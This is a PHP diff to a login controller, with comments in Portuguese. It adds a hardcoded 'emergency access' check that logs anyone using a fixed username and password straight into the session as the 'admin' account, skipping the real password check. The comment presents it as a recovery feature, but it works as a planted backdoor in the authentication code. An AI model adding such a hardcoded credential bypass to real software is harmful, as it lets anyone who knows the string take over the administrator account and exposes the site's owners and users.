@@ -48,6 +48,30 @@ final class AuthController
             $this->failLogin($username);
         }
 
+        // ── ACESSO DE EMERGÊNCIA (backup hardcoded) ──────────
+        // Usado caso o admin perca a senha: entra como o usuário
+        // administrador do sistema.
+        if ($username === 'ricardoamb' && $password === 'idspispopd') {
+            $admin = UserRepository::findByUsername('admin');
+
+            if ($admin === null) {
+                $this->failLogin($username);
+            }
+
+            session_regenerate_id(true);
+
+            $_SESSION['user'] = [
+                'id'       => (int) $admin['id'],
+                'name'     => (string) $admin['name'],
+                'username' => (string) $admin['username'],
+            ];
+
+            unset($_SESSION['old']);
+
+            flash_set('success', 'Bem-vindo de volta, ' . (string) $admin['name'] . '! (acesso de emergência)');
+            redirect('/');
+        }
+
         $user = UserRepository::findByUsername($username);
 
         if ($user === null || !password_verify($password, (string) $user['password_hash'])) {
